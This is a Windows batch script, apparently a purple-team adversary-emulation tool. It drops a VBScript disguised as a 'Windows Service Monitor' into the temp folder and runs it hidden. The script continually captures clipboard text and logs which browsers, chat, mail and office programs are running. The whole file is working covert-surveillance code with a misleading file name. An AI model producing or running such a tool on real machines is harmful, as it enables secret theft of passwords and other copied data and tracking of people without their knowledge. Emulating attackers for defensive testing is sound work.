@echo off
REM Purple Team - Launcher (T1218.005 mshta / T1059.005 VBScript)
REM Drops and runs clipboard+window monitor via mshta or wscript
REM No PowerShell, no hooks, no admin required

set "LOGFILE=%TEMP%\log.txt"
set "VBSFILE=%TEMP%\svcmon.vbs"

echo [%date% %time%] Started on %COMPUTERNAME%\%USERNAME% >> "%LOGFILE%"

REM ── Drop the VBS monitor ──
(
echo ' Windows Service Monitor
echo Dim fso, oShell, logPath, lastClip, lastWin
echo Set fso = CreateObject^("Scripting.FileSystemObject"^)
echo Set oShell = CreateObject^("WScript.Shell"^)
echo logPath = oShell.ExpandEnvironmentStrings^("%%TEMP%%"^) ^& "\log.txt"
echo lastClip = "" : lastWin = ""
echo.
echo Do While True
echo     On Error Resume Next
echo.
echo     ' Clipboard capture
echo     Dim hDoc, clipTxt
echo     Set hDoc = CreateObject^("htmlfile"^)
echo     clipTxt = hDoc.parentWindow.clipboardData.GetData^("text"^)
echo     Set hDoc = Nothing
echo     If Len^(clipTxt^) ^> 0 And clipTxt ^<^> lastClip Then
echo         lastClip = clipTxt
echo         LogIt "[CLIP] " ^& Left^(clipTxt, 500^)
echo     End If
echo.
echo     ' Window title tracking via AppActivate trick
echo     Dim objWMI, colItems, objItem, pList, pName
echo     Set objWMI = GetObject^("winmgmts:\\.\root\cimv2"^)
echo     Set colItems = objWMI.ExecQuery^("SELECT Name,Caption FROM Win32_Process WHERE SessionId ^> 0"^)
echo     pList = ""
echo     For Each objItem In colItems
echo         pName = LCase^(objItem.Name^)
echo         If pName = "chrome.exe" Or pName = "msedge.exe" Or pName = "firefox.exe" Or _
echo            pName = "notepad.exe" Or pName = "cmd.exe" Or pName = "outlook.exe" Or _
echo            pName = "teams.exe" Or pName = "slack.exe" Or pName = "winword.exe" Or _
echo            pName = "excel.exe" Or pName = "code.exe" Or pName = "mstsc.exe" Then
echo             If InStr^(pList, objItem.Name^) = 0 Then pList = pList ^& objItem.Name ^& " "
echo         End If
echo     Next
echo     Set objWMI = Nothing
echo     If Len^(Trim^(pList^)^) ^> 0 And pList ^<^> lastWin Then
echo         lastWin = pList
echo         LogIt "[PROCS] " ^& Trim^(pList^)
echo     End If
echo.
echo     On Error GoTo 0
echo     WScript.Sleep 3000
echo Loop
echo.
echo Sub LogIt^(msg^)
echo     Dim f
echo     Set f = fso.OpenTextFile^(logPath, 8, True^)
echo     f.WriteLine "[" ^& FormatDateTime^(Now, 4^) ^& "] " ^& msg
echo     f.Close
echo     Set f = Nothing
echo End Sub
) > "%VBSFILE%"

REM ── Run hidden via wscript ──
start "" /b wscript.exe //nologo //B "%VBSFILE%"

echo [*] Monitor running in background. Logs: %LOGFILE%
echo [*] To stop: taskkill /f /im wscript.exe
